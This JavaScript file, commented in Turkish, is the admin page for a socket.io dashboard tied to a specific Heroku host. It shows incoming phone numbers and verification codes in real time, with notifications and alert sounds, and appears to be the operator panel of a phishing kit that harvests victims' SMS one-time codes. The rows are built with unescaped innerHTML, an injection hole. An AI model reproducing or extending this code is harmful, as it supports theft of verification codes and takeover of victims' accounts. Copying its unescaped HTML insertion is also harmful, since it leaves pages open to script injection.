console.log("ADMIN SCRIPT YÜKLENDİ");

const socket = io('https://afternoon-lake-61658-70a3b4756b95.herokuapp.com');

socket.on("connect", () => {
  console.log("ADMIN SOCKET CONNECTED:", socket.id);
});

let audioEnabled = false;  // Sesleri etkinleştirme bayrağı

// Sesleri etkinleştirme butonu (admin.html'e ekle, aşağıda açıklıyorum)
document.addEventListener("DOMContentLoaded", () => {
  const enableAudioBtn = document.getElementById("enable-audio-btn");  // Buton ID'si
  if (enableAudioBtn) {
    enableAudioBtn.addEventListener("click", () => {
      audioEnabled = true;
      enableAudioBtn.disabled = true;  // Butonu devre dışı bırak
      console.log("Sesler etkinleştirildi");
    });
  }
});

// Yeni telefon numarası alındığında
socket.on("admin-new-phone", (data) => {
  console.log("ADMIN PHONE GELDİ:", data);

  const tr = document.createElement("tr");
  tr.classList.add("flash"); // Yanıp sönme efekti ekle
  tr.innerHTML = `<td>${data.phone}</td><td>${data.date}</td>`;
  phoneTable.prepend(tr);

  // Bildirim
  if (Notification.permission === "granted") {
    new Notification("Yeni Telefon", { body: `Telefon: ${data.phone}` });
  } else if (Notification.permission !== "denied") {
    Notification.requestPermission().then(perm => {
      if (perm === "granted") new Notification("Yeni Telefon", { body: `Telefon: ${data.phone}` });
    });
  }

  // Ses
  if (audioEnabled) {
    const audio = new Audio('/phone.mp3');
    audio.play().catch(err => console.log('Ses hatası:', err));
  } else {
    console.log("Ses çalınmadı: Kullanıcı etkileşimi gerekiyor");
  }
});

// Yeni doğrulama kodu alındığında
socket.on("admin-new-code", (data) => {
  console.log("ADMIN CODE GELDİ:", data);

  const tr = document.createElement("tr");
  tr.classList.add("flash"); // Yanıp sönme efekti ekle
  tr.innerHTML = `<td>${data.code}</td><td>${data.date}</td>`;
  codeTable.prepend(tr);

  // Bildirim
  if (Notification.permission === "granted") {
    new Notification("Yeni Kod", { body: `Kod: ${data.code}` });
  } else if (Notification.permission !== "denied") {
    Notification.requestPermission().then(perm => {
      if (perm === "granted") new Notification("Yeni Kod", { body: `Kod: ${data.code}` });
    });
  }

  // Ses
  if (audioEnabled) {
    const audio = new Audio('/code.mp3');
    audio.play().catch(err => console.log('Ses hatası:', err));
  } else {
    console.log("Ses çalınmadı: Kullanıcı etkileşimi gerekiyor");
  }
});